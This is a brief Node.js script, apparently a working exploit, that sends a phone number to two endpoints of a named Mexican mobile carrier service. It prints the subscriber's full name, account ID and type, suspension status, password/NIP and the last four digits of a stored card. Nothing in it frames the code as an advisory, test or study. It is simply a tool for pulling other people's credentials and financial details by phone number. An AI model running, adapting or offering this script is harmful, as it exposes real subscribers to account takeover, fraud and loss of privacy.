var request = require('request');

var number = process.argv[2];
var base1 = 'http://movil2.speedymovil.com.mx/perfils/autenticar/';
var base2 = 'http://movil2.speedymovil.com.mx/servicios/mdn_query/';

request(base1 + number + '.json', function(error, response, body) {
  var json = JSON.parse(body);
  var first = json.nombre;
  var last = json.apellidos;
  var telcel = json.esTelcel;
  var id = json.id;
  var nip = json.nip;
  var type = json.perfil;
  var suspended = json.suspendida;

  console.log('Account Name   : ' + first.trim() + ' ' + last);
  console.log('Telcel?        : ' + telcel);
  console.log('Account Type   : ' + type);
  console.log('Account ID     : ' + id);
  console.log('Password/NIP   : ' + nip);
  console.log('Suspended?     : ' + suspended);
});

request(base2 + number + '.json', function(error, response, body) {
  var json = JSON.parse(body);
  var digits = json.numerosDeTarjeta[0].pd_account_number_last4;
  console.log('Last Card #\'s  : ' + digits);
});
